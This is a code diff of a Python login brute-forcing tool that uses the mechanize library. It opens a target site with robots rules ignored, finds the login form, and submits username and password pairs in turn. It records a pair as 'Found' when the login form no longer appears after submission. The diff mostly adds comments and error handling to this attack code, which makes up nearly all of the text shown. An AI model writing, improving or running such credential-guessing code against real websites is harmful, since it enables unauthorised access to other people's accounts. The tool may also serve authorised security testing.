@@ -3,9 +3,8 @@ import actions, utils, sys, mechanize
 ##################################################################
 #
 #	TODO:
-#		+) Reading huge file
 #		+) Multi threading
-#		+) Better form detecting and parsing
+#		+) Better form detection logic
 #		+) Better automatic login condition - gmail, etc..
 #
 #	TODO FURTHER
@@ -45,15 +44,24 @@ class BruteForcing(object):
 		self.actTestConnection()
 
 	def actTestConnection(self):
+
+		#	Create Browser object
 		process = mechanize.Browser()
 		process.addheaders = [('User-Agent', self.varUserAgent)]
 		process.set_handle_robots(False)
+
+		#	Connecting to Target
 		utils.printf("Testing connection....")
+
 		try:
 			process.open(self.varTargetURL)
 			utils.printf("Connected to URL. Gathering login form information...\n", "good")
 			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_testFormInformation(process.forms())
 			process.close()
+
+		except TypeError:
+			sys.exit(utils.craft_msg("Can not find any login form in %s" %(self.varTargetURL), "bad"))
+
 		except mechanize.HTTPError as error:
 			sys.exit(utils.craft_msg(error, "bad"))
 
@@ -62,12 +70,23 @@ class BruteForcing(object):
 
 	def actTryTargetLogin(self, browserObject, tryUsername, tryPassowrd, count):
 		try:
+			#	Fill Login field Information
 			browserObject.select_form(nr = self.frmLoginID)
 			browserObject.form[self.frmUserField] = tryUsername
 			browserObject.form[self.frmPassField] = tryPassowrd
+
+			#	Print progress bar
 			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassowrd, '=' * 6, count, self.szPassword))
-			req = browserObject.submit()
+
+			#	Send request
+			browserObject.submit()
+
+			#	Refresh page, useful for redirect after login
 			browserObject.reload()
+
+			#	If result has no login form  -> Success **NEED IMPROVE**
+			#		add login information to fndData, return True
+
 			if not actions.action_getFormInformation(browserObject.forms()):
 				utils.printf("Found: %s:%s" %(tryUsername, tryPassowrd), "good")
 				self.fndData.append([tryUsername, tryPassowrd])
